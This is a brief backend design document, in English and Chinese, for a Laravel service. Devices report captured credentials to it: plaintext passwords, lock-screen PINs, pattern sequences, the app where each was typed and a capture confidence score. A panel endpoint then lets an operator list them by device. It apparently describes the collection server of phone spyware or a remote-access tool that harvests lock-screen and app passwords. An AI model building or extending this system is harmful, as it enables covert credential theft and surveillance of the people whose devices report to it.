# Device Credentials API Design

**Date:** 2026-04-22
**Scope:** Laravel app/ — 设备密码上报 + Panel 查询

## Decisions

- Auth: 统一 `auth.device` 中间件（Bearer token）
- Database: 单表 `device_credentials`，`source` 列区分来源
- Scope: 2 个设备上报 + 1 个 Panel 查询

## Database: device_credentials

| Column | Type | Notes |
|--------|------|-------|
| id | bigint PK | auto |
| device_id | bigint FK→devices.id | index |
| user_id | bigint FK→users.id | index |
| device_uid | varchar(64) | index |
| source | varchar(20) | 'credentials' / 'cipher' / 'websocket' |
| password | text nullable | credentials 路径明文 |
| password_type | varchar(30) nullable | pin/pattern/password/unknown |
| input_method | varchar(50) nullable | system_auth_capture 等 |
| app_name | varchar(100) nullable | |
| package_name | varchar(255) nullable | |
| confidence | tinyint unsigned nullable | 0-100 |
| cipher_grade_code | varchar(50) nullable | PASSWORD_QUALITY_* |
| text_cipher | text nullable | cipher 路径文本密码 |
| pattern_cipher | varchar(255) nullable | 图案索引 '0,1,2,4,6,7,8' |
| is_locked | boolean | default true |
| device_timestamp | timestamp nullable | 设备端捕获时间 |
| created_at | timestamp | |
| updated_at | timestamp | |

## API Endpoints

### POST /api/sync/credentials (auth.device)

Request: `{deviceId, password, passwordType, inputMethod, appName, packageName, confidence, timestamp}`
Response: `{success, code, msg, data: {id}}`

### POST /api/sync/cipher (auth.device)

Request: `{cipherGradeCode, textCipher, patternCipher, isLocked, captureTime}`
Response: `{success, code, msg, data: {id}}`

### GET /api/device-credentials (auth:sanctum)

Query: `?device_uid=&password_type=&source=&per_page=50`
Response: paginated `{success, code, msg, data: {data, meta}}`

## Files

- `database/migrations/2026_04_22_000001_create_device_credentials_table.php`
- `app/Models/DeviceCredential.php`
- `app/Http/Controllers/Api/DeviceCredentialController.php`
- `app/Http/Requests/Device/SyncCredentialsRequest.php`
- `app/Http/Requests/Device/SyncCipherRequest.php`
- `routes/api.php` (add 3 routes)
- `tests/Feature/Api/DeviceCredentialTest.php`
